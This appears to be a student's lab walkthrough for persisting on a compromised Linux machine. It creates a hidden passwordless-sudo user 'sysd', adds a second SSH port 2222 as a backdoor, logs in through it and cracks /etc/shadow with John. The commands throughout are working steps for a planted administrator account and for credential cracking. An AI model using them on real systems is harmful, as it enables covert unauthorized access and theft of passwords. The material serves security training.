Step 1: Shadow People


Create a secret user named sysd. Make sure this user doesn't have a home folder created:

adduser --no-create-home --uid 980 --quiet sysd



Give your secret user a password:

passwd sysd



Give your secret user a system UID < 1000:

usermod -u 980 sysd



Give your secret user the same GID:

usermod -g 980 sysd



Give your secret user full sudo access without the need for a password:

nano visudo then you add 'sysd ALL=(ALL:ALL) NOPASSWD:ALL



Test that sudo access works without your password:SU
sudo -l



Step 2: Smooth Sailing


Edit the sshd_config file:
add port 2222 under port 22


Step 3: Testing Your Configuration Update


Restart the SSH service:

sudo systemctl restart ssh.service



Exit the root account:

exit



SSH to the target machine using your sysd account and port 2222:

ssh sysd@192.168.6.105 -p 2222



Use sudo to switch to the root user:

sudo su root



Step 4: Crack All the Passwords


SSH back to the system using your sysd account and port 2222:

ssh sysd@192.168.6.105 -p 2222



Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:

sudo su root



---john /etc/shadow --wordlist=/home/student/Desktop/.pass_list.txt
